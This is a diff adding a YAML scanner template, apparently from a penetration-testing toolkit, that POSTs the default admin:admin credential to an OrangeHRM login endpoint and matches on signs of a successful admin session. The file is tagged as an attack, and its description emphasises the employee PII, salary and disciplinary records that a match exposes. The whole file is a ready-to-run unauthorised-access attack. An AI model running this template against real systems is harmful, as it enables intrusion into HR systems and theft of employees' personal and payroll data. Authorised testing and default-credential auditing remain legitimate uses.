@@ -1,0 +1,61 @@
+# OrangeHRM default credential login attempt.
+id: orangehrm-default-login
+
+info:
+  name: OrangeHRM Default Credentials
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 1
+    kind: attack
+  description: |
+    OrangeHRM Starter ships the documented default credential admin:admin
+    and stock installs keep it. The admin session reaches every employee
+    record, the payroll surface and the document attachments.
+
+    This template POSTs the default credential to the OrangeHRM auth
+    endpoint (legacy /symfony/web/index.php path and the v5 /auth/login
+    path are both tried by the redirect behavior). A match means full HR
+    administration: employee PII, salary bands, disciplinary records and
+    uploaded documents.
+
+    One POST request. The credential is a documented vendor default.
+  reference:
+    - https://github.com/orangehrm/orangehrm
+  tags: hr,orangehrm,default-login,attack
+
+http:
+  - raw:
+      - |
+        POST /symfony/web/index.php/auth/verifyCredentials HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+      - type: word
+        part: header
+        condition: or
+        words:
+          - "orangehrm"
+          - "Loggedin=True"
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "dashboard"
+          - "logout"
+          - "Welcome"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Invalid credentials"
+          - "authentication failed"
